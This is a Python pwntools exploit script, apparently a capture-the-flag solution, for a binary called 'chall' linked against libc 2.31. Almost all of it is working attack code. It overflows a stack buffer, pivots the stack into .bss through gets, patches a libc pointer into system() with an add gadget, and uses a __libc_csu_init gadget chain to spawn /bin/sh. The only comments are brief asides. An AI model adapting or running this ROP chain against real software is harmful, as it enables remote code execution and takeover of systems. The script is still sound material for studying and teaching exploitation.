#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./chall')
libc = ELF('./libc-2.31.so')
p = process(binary.path)

new_stack = (binary.bss() & 0xfff000) + 0xf00
pop_rdi = binary.search(asm('pop rdi; ret')).__next__()
pop_rsp_r13_r14_r15 = binary.search(asm('pop rsp; pop r13; pop r14; pop r15; ret')).__next__()

payload  = b''
payload += 0x88 * b'A'
payload += p64(pop_rdi)
payload += p64(new_stack)
payload += p64(binary.plt.gets)
payload += p64(pop_rsp_r13_r14_r15)
payload += p64(new_stack)

gdb.attach(p, '''b _start''')
p.sendline(payload)

# let's start over with a new stack
payload  = b''
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(binary.sym._start)

p.sendline(payload)

if args.REMOTE: time.sleep(0.1) # give some time to start up :-)

'''
  4011a0:	4c 89 f2             	mov    rdx,r14
  4011a3:	4c 89 ee             	mov    rsi,r13
  4011a6:	44 89 e7             	mov    edi,r12d
  4011a9:	41 ff 14 df          	call   QWORD PTR [r15+rbx*8]
  4011ad:	48 83 c3 01          	add    rbx,0x1
  4011b1:	48 39 dd             	cmp    rbp,rbx
  4011b4:	75 ea                	jne    4011a0 <__libc_csu_init+0x40>
  4011b6:	48 83 c4 08          	add    rsp,0x8
  4011ba:	5b                   	pop    rbx
  4011bb:	5d                   	pop    rbp
  4011bc:	41 5c                	pop    r12
  4011be:	41 5d                	pop    r13
  4011c0:	41 5e                	pop    r14
  4011c2:	41 5f                	pop    r15
  4011c4:	c3                   	ret
'''
set_rdx_rsi_rdi_call_r15 = 0x4011a0
add_dword_ptr_rbp_ebx = binary.search(asm('add dword ptr [rbp - 0x3d], ebx; nop; ret')).__next__()
pop_rbx_rbp_r12_r13_r14_r15 = binary.search(asm('pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret')).__next__()

payload  = b''
payload += 0x88 * b'A'
payload += p64(pop_rbx_rbp_r12_r13_r14_r15)
payload += p64((libc.sym.system - libc.sym._IO_2_1_stdin_) & (1 << 32) - 1)
payload += p64(new_stack - 0x1b0 + 0x3d)
payload += 4 * p64(0)
payload += p64(add_dword_ptr_rbp_ebx)
payload += p64(pop_rdi+1) # align stack for system
payload += p64(pop_rbx_rbp_r12_r13_r14_r15)
payload += p64(0) # rbx
payload += p64(1) # rbp to get pass check, but not needed here, just habit
payload += p64(new_stack - 0x40) # r12/rdi /bin/sh downstack
payload += p64(0) # r13/rsi
payload += p64(0) # r14/rdx
payload += p64(new_stack - 0x1b0) # r15 pointer to function (system)
payload += p64(set_rdx_rsi_rdi_call_r15)
payload += b'/bin/sh' # \0 from gets for free, gets just keeps on giving

p.sendline(payload)
p.interactive()